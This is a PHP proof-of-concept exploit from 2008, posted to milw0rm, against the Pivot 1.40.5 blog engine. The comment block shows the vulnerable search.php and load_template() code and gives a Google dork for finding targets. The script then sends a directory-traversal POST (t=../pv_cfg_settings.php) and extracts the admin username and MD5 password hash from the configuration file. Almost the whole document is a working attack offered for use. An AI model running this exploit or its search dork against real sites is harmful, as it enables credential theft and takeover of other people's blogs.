<?php
        /*

         Pivot 1.40.5 'Dreamwind' load_template() credentials disclosure exploit

         by Nine:Situations:Group::bookoo

         our site: http://retrogod.altervista.org/
         software site: http://www.pivotlog.net/

         Google dork: "by Pivot - 1.40.5"  +'Dreadwind' -pivotlog.net


         vulnerability:

         search.php - lines 98-109:

         ...
         // Set the template for the tags page
         if (!isset($Pivot_Vars['t']) || empty($Pivot_Vars['t'])) {
	     if (isset($Weblogs[$Current_weblog]['extra_template']) && ($Weblogs[$Current_weblog]['extra_template']!="") ) {
	    	$template = $Weblogs[$Current_weblog]['extra_template'];
	     } else {
		$template = $Weblogs[$Current_weblog]['archive_template'];
	     }
         } else {
	      $template = $Pivot_Vars['t'];
         }

         $template_html = load_template($template);
         ...

         't' argument is passed to load_template() function without checks

         see load_template() function in /modules/module_parser.php - lines 778-797

         ...
         function load_template($basename) {
	     global $template_cache, $Paths;

	     $filename = $Paths['templates_path'].$basename;

	     if (isset($template_cache[$basename])) {
	    	return $template_cache[$basename];
	     } else {

	  	if (!(file_exists($filename))) {
	 		$filename = $Paths['templates_path']."entrypage_template.html";
		}
            $filetext=implode("", file($filename)); // <----------------------------|_ lol !!!

		$template_cache[$basename]=$filetext;

		return $filetext;
	 }

        }
        ...

        our argument is passed to a file() function, so, regardless of php settings,
        we can see php files at screen trough directory traversal attacks, including the
        configuration file (pv_cfg_settings.php), which cointains the admin credentials
        (username/md5 hash/sessions...)

        note: 't' can be passed as GET or POST
        ----------------------------------------------------------------------------

        If you think this poc is useful, please help us to improve our equipment and
        donate through the paypal button on our site!
        */

        error_reporting(7);
        $host=$argv[1];
        $path=$argv[2];
        $argv[3] ? $port = (int) $argv[3] : $port = 80;
        $argv[2] ? print("attackin'...\n") : die ("syntax: php ".$argv[0]." [host] [path] [[port]]");

        $win = (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN') ? true : false;
        $win ? dl("php_curl.dll") : dl("php_curl.so");

        $url = "http://$host:$port";

        $exploit="t=../pv_cfg_settings.php";

        $header ="POST ".$path."search.php HTTP/1.0\r\n";
        $header.="Host: $host\r\n";
        $header.="Content-Type: application/x-www-form-urlencoded\r\n";
        $header.="Content-Length: ".strlen($exploit)."\r\n";
        $header.="Connection: Close\r\n\r\n";
        $header.=$exploit;

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,$url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 0);
        curl_setopt($ch, CURLOPT_CUSTOMREQUEST, $header);


        $data = curl_exec($ch); if (curl_errno($ch)) {
           print curl_error($ch)."\n";
        } else {
           curl_close($ch);
        }
        // print $data."\n";
        preg_match("/userlevel\|4\|/",$data) ? print("exploit succeeded!") : die("exploit failed!");
        $tmp=explode("user-",$data);$tmpii=explode("!",$tmp[1]);$admin=$tmpii[0];
        print "\n\nadmin user: ".$admin."\n";
        $tmp=explode("pass|",$data);$tmpii=explode("|",$tmp[1]);$hash=$tmpii[0];
        print "\nmd5 hash  : ".$hash."\n";


?>

# milw0rm.com [2008-06-30]
